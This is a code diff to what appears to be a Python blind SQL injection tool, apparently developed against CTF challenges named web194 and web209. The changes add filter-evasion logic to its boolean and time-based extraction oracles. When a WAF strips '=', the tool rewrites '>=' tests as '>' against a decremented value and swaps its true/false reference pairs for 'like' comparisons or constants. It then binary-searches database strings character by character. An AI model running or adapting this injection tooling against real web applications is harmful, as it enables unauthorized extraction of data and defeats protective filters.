@@ -40,6 +40,13 @@ class BaseOracle:
         """取回标量表达式的字符串值。"""
         raise NotImplementedError
 
+    def _ge(self, lhs: str, rhs: str, rhs_dec: str) -> str:
+        """lhs >= rhs 条件；= 被滤（waf 拒绝/剥离）时降级 lhs > rhs_dec，
+        语义等价改写（web209 实测：= 在黑名单里 >= 全灭）。"""
+        if self.waf.is_filtered("="):
+            return f"{lhs}>{rhs_dec}"
+        return f"{lhs}>={rhs}"
+
     def _substr_at(self, expr: str, pos: int) -> str:
         """位置 pos 起的子串表达式（外层 ascii() 取首字符码点即单字符）。
 
@@ -256,8 +263,17 @@ class BoolOracle(BaseOracle):
         # → arith（「都过滤了」类：'-cond-' 减法两态，见 builder.logic_arith）
         for joiner in ("or", "and", "xor", "arith"):
             fn = getattr(self.b, f"logic_{joiner}")
-            r_true = self.s.request_value(self.b.wrap(fn("1=1")))
-            r_false = self.s.request_value(self.b.wrap(fn("1=2")))
+            if joiner == "arith" and self.b.waf.is_filtered("="):
+                # = 被剥离时 1=1 → 11 恒常量（web209 实测），两态改用常量对，
+                # 方向与 1=1/1=2 对齐：真条件（非 0）→ 空页，假条件（0）→ 全表页
+                true_c, false_c = "1", "0"
+            elif self.b.waf.is_filtered("="):
+                # = 被剥离时 and(11)/and(12) 双双恒真，参照对改 like（web209 实测）
+                true_c, false_c = "(1)like(1)", "(1)like(2)"
+            else:
+                true_c, false_c = "1=1", "1=2"
+            r_true = self.s.request_value(self.b.wrap(fn(true_c)))
+            r_false = self.s.request_value(self.b.wrap(fn(false_c)))
             if similarity(r_true, r_false) > 0.995:
                 continue
             self.R_true, self.R_false = r_true, r_false
@@ -311,7 +327,8 @@ class BoolOracle(BaseOracle):
             if self.eval_bool(f"{self.code_expr(a)}{eq}{self.code_expr(b)}"):
                 return prev
         code = self._binsearch(
-            lambda m: f"{self.code_expr(self._substr_at(expr, pos))}>={m}", 32, 126)
+            lambda m: self._ge(self.code_expr(self._substr_at(expr, pos)),
+                               f"{m}", f"{m - 1}"), 32, 126)
         return chr(code)
 
     def _char_at_cmp(self, expr: str, pos: int) -> str:
@@ -335,11 +352,14 @@ class BoolOracle(BaseOracle):
                 raise OracleError("用户中止")
             if use_char:
                 rhs = f"char({mid})"
+                rhs_dec = f"char({mid - 1})"
             else:
                 # char 也被滤（web194）：退到字符串字面量（引号可用时）
                 ch = chr(mid).replace("\\", "\\\\").replace("'", "\\'")
                 rhs = f"'{ch}'"
-            if self.eval_bool(f"{sub}>={rhs}"):
+                chd = chr(mid - 1).replace("\\", "\\\\").replace("'", "\\'")
+                rhs_dec = f"'{chd}'"
+            if self.eval_bool(self._ge(sub, rhs, rhs_dec)):
                 lo = mid
             else:
                 hi = mid - 1
@@ -366,7 +386,8 @@ class BoolOracle(BaseOracle):
             raise OracleError("码点/截取/定长函数被过滤，布尔通道不可用")
         if not self.eval_bool(f"length(({expr}))>0"):
             return ""
-        length = self._binsearch(lambda m: f"length(({expr}))>={m}", 1, 1024)
+        length = self._binsearch(
+            lambda m: self._ge(f"length(({expr}))", f"{m}", f"{m - 1}"), 1, 1024)
         self.s.log("INFO", f"[bool] 长度={length}，分块并发提取: {expr[:60]}")
         result = [""] * length
         BLOCK = 16
@@ -554,7 +575,8 @@ class TimeOracle(BaseOracle):
             raise OracleError("码点/截取/定长函数被过滤，时间通道不可用")
         if not self.eval_bool(f"length(({expr}))>0"):
             return ""
-        length = self._binsearch(lambda m: f"length(({expr}))>={m}", 1, 512)
+        length = self._binsearch(
+            lambda m: self._ge(f"length(({expr}))", f"{m}", f"{m - 1}"), 1, 512)
         self.s.log("INFO", f"[time] 长度={length}，游程+分块提取: {expr[:60]}")
         out = []
         prev = None
@@ -569,7 +591,8 @@ class TimeOracle(BaseOracle):
                     out.append(prev)
                     continue
             code = self._binsearch(
-                lambda m: f"{self.code_expr(self._substr_at(expr, p))}>={m}", 32, 126)
+                lambda m: self._ge(self.code_expr(self._substr_at(expr, p)),
+                                   f"{m}", f"{m - 1}"), 32, 126)
             ch = chr(code)
             out.append(ch)
             prev = ch or None
